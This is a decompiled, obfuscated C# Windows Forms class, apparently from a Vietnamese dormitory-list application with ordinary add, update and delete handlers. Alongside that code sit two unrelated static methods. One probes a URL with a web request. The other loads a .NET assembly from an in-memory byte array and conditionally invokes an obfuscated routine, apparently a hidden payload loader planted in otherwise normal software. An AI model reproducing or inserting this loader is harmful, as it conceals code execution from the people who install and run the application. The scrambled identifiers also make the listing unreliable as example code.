using System;
using System.ComponentModel;
using System.Drawing;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Ey8t;
using Gp7;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Nj0;
using Yj2;
using s8C;

namespace Ss8;

[DesignerGenerated]
public class b0Y : Form
{
	private IContainer components;

	private Button _Button6;

	internal DataGridView Q;

	internal Label e;

	internal Label u;

	internal TextBox L;

	internal TextBox J;

	internal Button v;

	internal Button T;

	public b0Y()
	{
		((Form)this).add_Load((EventHandler)Sx6);
		Qq0();
	}

	protected override void b8L(bool j5P)
	{
		if (j5P && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(j5P);
	}

	private void Qq0()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		//IL_0038: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		//IL_0043: Unknown result type (might be due to invalid IL or missing references)
		//IL_004d: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_00de: Unknown result type (might be due to invalid IL or missing references)
		//IL_00e8: Expected O, but got Unknown
		//IL_0159: Unknown result type (might be due to invalid IL or missing references)
		//IL_0163: Expected O, but got Unknown
		//IL_01c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d2: Expected O, but got Unknown
		//IL_022d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0237: Expected O, but got Unknown
		//IL_028f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0299: Expected O, but got Unknown
		//IL_0310: Unknown result type (might be due to invalid IL or missing references)
		//IL_031a: Expected O, but got Unknown
		//IL_0391: Unknown result type (might be due to invalid IL or missing references)
		//IL_039b: Expected O, but got Unknown
		Ap4(new DataGridView());
		z6G(new Label());
		Bo6(new Label());
		Hz1(new TextBox());
		Kj7(new TextBox());
		x7E(new Button());
		y4Z(new Button());
		Pe0(new Button());
		((ISupportInitialize)Kb8()).BeginInit();
		((Control)this).SuspendLayout();
		Kb8().set_ColumnHeadersHeightSizeMode((DataGridViewColumnHeadersHeightSizeMode)2);
		((Control)Kb8()).set_Location(new Point(12, 187));
		((Control)Kb8()).set_Name("DataGridView1");
		((Control)Kb8()).set_Size(new Size(448, 309));
		((Control)Kb8()).set_TabIndex(0);
		a3P().set_AutoSize(true);
		((Control)a3P()).set_Font(new Font("Microsoft Sans Serif", 12.25f));
		((Control)a3P()).set_Location(new Point(22, 74));
		((Control)a3P()).set_Name("Label2");
		((Control)a3P()).set_Size(new Size(86, 20));
		((Control)a3P()).set_TabIndex(56);
		a3P().set_Text("Tên ký túc");
		x1K().set_AutoSize(true);
		((Control)x1K()).set_Font(new Font("Microsoft Sans Serif", 12.25f));
		((Control)x1K()).set_Location(new Point(22, 32));
		((Control)x1K()).set_Name("Label1");
		((Control)x1K()).set_Size(new Size(81, 20));
		((Control)x1K()).set_TabIndex(55);
		x1K().set_Text("Mã ký túc");
		((Control)c2Z()).set_Font(new Font("Microsoft Sans Serif", 12.25f));
		((Control)c2Z()).set_Location(new Point(147, 71));
		((Control)c2Z()).set_Name("TextBox2");
		((Control)c2Z()).set_Size(new Size(237, 26));
		((Control)c2Z()).set_TabIndex(54);
		((Control)Ei9()).set_Font(new Font("Microsoft Sans Serif", 12.25f));
		((Control)Ei9()).set_Location(new Point(147, 29));
		((Control)Ei9()).set_Name("TextBox1");
		((Control)Ei9()).set_Size(new Size(101, 26));
		((Control)Ei9()).set_TabIndex(53);
		((Control)f6L()).set_Font(new Font("Microsoft Sans Serif", 12.25f));
		((Control)f6L()).set_Location(new Point(333, 131));
		((Control)f6L()).set_Name("Button1");
		((Control)f6L()).set_Size(new Size(127, 33));
		((Control)f6L()).set_TabIndex(60);
		((ButtonBase)f6L()).set_Text("Thoát");
		((ButtonBase)f6L()).set_UseVisualStyleBackColor(true);
		((Control)b1K()).set_Font(new Font("Microsoft Sans Serif", 12.25f));
		((Control)b1K()).set_Location(new Point(171, 131));
		((Control)b1K()).set_Name("Button5");
		((Control)b1K()).set_Size(new Size(127, 33));
		((Control)b1K()).set_TabIndex(58);
		((ButtonBase)b1K()).set_Text("Xóa");
		((ButtonBase)b1K()).set_UseVisualStyleBackColor(true);
		((Control)Rc8()).set_Font(new Font("Microsoft Sans Serif", 12.25f));
		((Control)Rc8()).set_Location(new Point(12, 131));
		((Control)Rc8()).set_Name("Button6");
		((Control)Rc8()).set_Size(new Size(127, 33));
		((Control)Rc8()).set_TabIndex(57);
		((ButtonBase)Rc8()).set_Text("Cập nhật");
		((ButtonBase)Rc8()).set_UseVisualStyleBackColor(true);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(472, 517));
		((Control)this).get_Controls().Add((Control)(object)f6L());
		((Control)this).get_Controls().Add((Control)(object)b1K());
		((Control)this).get_Controls().Add((Control)(object)Rc8());
		((Control)this).get_Controls().Add((Control)(object)a3P());
		((Control)this).get_Controls().Add((Control)(object)x1K());
		((Control)this).get_Controls().Add((Control)(object)c2Z());
		((Control)this).get_Controls().Add((Control)(object)Ei9());
		((Control)this).get_Controls().Add((Control)(object)Kb8());
		((Control)this).set_Name("Form4");
		((Form)this).set_Text("Danh sách ký túc");
		((ISupportInitialize)Kb8()).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	[SpecialName]
	internal virtual DataGridView Kb8()
	{
		return Q;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Ap4(DataGridView Wn2)
	{
		DataGridView val = (Q = Wn2);
	}

	[SpecialName]
	internal virtual Label a3P()
	{
		return e;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void z6G(Label t9L)
	{
		Label val = (e = t9L);
	}

	[SpecialName]
	internal virtual Label x1K()
	{
		return u;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Bo6(Label x5N)
	{
		Label val = (u = x5N);
	}

	[SpecialName]
	internal virtual TextBox c2Z()
	{
		return L;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Hz1(TextBox t2Y)
	{
		TextBox val = (L = t2Y);
	}

	[SpecialName]
	internal virtual TextBox Ei9()
	{
		return J;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Kj7(TextBox Tp4)
	{
		TextBox val = (J = Tp4);
	}

	[SpecialName]
	internal virtual Button f6L()
	{
		return v;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void x7E(Button Mo9)
	{
		EventHandler eventHandler = f9S;
		Button val = v;
		if (val != null)
		{
			((Control)val).remove_Click(eventHandler);
		}
		Button val2 = (v = Mo9);
		val = v;
		if (val != null)
		{
			((Control)val).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Button b1K()
	{
		return T;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void y4Z(Button Zo6)
	{
		EventHandler eventHandler = Gc6;
		Button t = T;
		if (t != null)
		{
			((Control)t).remove_Click(eventHandler);
		}
		Button val = (T = Zo6);
		t = T;
		if (t != null)
		{
			((Control)t).add_Click(eventHandler);
		}
	}

	[SpecialName]
	internal virtual Button Rc8()
	{
		return _Button6;
	}

	[MethodImpl(MethodImplOptions.Synchronized)]
	[SpecialName]
	internal virtual void Pe0(Button d4M)
	{
		EventHandler eventHandler = Bj4;
		Button button = _Button6;
		if (button != null)
		{
			((Control)button).remove_Click(eventHandler);
		}
		_Button6 = d4M;
		button = _Button6;
		if (button != null)
		{
			((Control)button).add_Click(eventHandler);
		}
	}

	private void Sx6(object sender, EventArgs e)
	{
		d0N.Wk01();
		Kb8().set_DataSource((object)Nn6.ds.Tables["kytuc"]);
	}

	private void Bj4(object sender, EventArgs e)
	{
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		if (d0N.Yd86(Ei9().get_Text()) == 0)
		{
			long num = (long)Interaction.MsgBox((object)"Bạn muốn thêm mới", (MsgBoxStyle)1, (object)"Thông Báo");
			if (num == 1L)
			{
				d0N.c2PC(Ei9().get_Text(), c2Z().get_Text());
			}
			else
			{
				num = 2L;
			}
		}
		else
		{
			long num = (long)Interaction.MsgBox((object)"Mã khoa đã tồn tại,bạn có muốn sửa ?", (MsgBoxStyle)1, (object)"Thông Báo ");
			if (num == 1L)
			{
				d0N.e9AG(Ei9().get_Text(), c2Z().get_Text());
			}
			else
			{
				num = 2L;
			}
		}
	}

	internal static bool Tr1(string d3Q)
	{
		try
		{
			WebRequest webRequest = WebRequest.Create(d3Q);
			webRequest.GetResponse();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
		return true;
	}

	private void Gc6(object sender, EventArgs e)
	{
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		if (d0N.Yd86(Ei9().get_Text()) == 0)
		{
			Interaction.MsgBox((object)"Không có mã khoa này , không xóa được", (MsgBoxStyle)64, (object)"Thông báo");
		}
		else
		{
			d0N.s1GY(Ei9().get_Text());
		}
	}

	internal static void Lk1()
	{
		object obj = Thread.GetDomain().Load((byte[])Ct6.mDic[Ct6.mArray]);
		Ct6.mDic.Add("Ass2", RuntimeHelpers.GetObjectValue(obj));
		obj = null;
		if (z6A.Ym8())
		{
			Kn5.Ft4();
		}
	}

	private void f9S(object sender, EventArgs e)
	{
		((Control)this).Hide();
	}
}
